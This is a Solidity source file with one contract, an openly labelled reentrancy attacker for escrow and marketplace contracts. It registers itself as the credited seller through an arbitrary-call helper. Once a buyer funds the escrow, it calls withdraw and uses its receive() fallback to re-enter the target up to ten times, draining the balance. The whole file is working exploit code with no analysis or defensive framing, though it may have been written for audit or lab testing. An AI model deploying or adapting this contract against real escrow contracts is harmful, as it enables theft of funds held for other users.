// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Reentrancy attacker for escrow/marketplace contracts where the attacker
/// must first call a setup function (e.g. createListing) FROM its own address so
/// that it becomes the credited party in the escrow mapping, before an external
/// buyer funds the escrow and the attacker drains it via re-entry.
contract EscrowReentrancyAttacker {
    address public target;
    bytes public reentryCalldata;
    uint256 public reentryCount;
    bool public attackInProgress;

    event SetupCall(bytes data, bool success);
    event AttackStarted();
    event Reentered(uint256 count, uint256 targetBalance);
    event AttackFinished(uint256 balance);

    constructor(address _target) {
        target = _target;
    }

    /// @notice Execute an arbitrary call on the target FROM this contract's address.
    /// Used for setup steps like createListing() so the attacker contract becomes
    /// the credited seller in the escrow mapping.
    function execute(bytes calldata data, uint256 value) external payable returns (bool success) {
        (success, ) = target.call{value: value}(data);
        emit SetupCall(data, success);
    }

    /// @notice Trigger the reentrancy attack. Call AFTER escrow has been funded.
    /// No deposit step — state was set up via execute() + external buyer calls.
    function attack(bytes calldata withdrawCalldata) external {
        reentryCalldata = withdrawCalldata;
        reentryCount = 0;
        attackInProgress = true;
        emit AttackStarted();

        (bool ws, ) = target.call(withdrawCalldata);
        require(ws, "Withdraw call failed");

        attackInProgress = false;
        emit AttackFinished(address(this).balance);
    }

    receive() external payable {
        if (attackInProgress && reentryCount < 10 && target.balance > 0) {
            reentryCount++;
            emit Reentered(reentryCount, target.balance);
            target.call(reentryCalldata);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
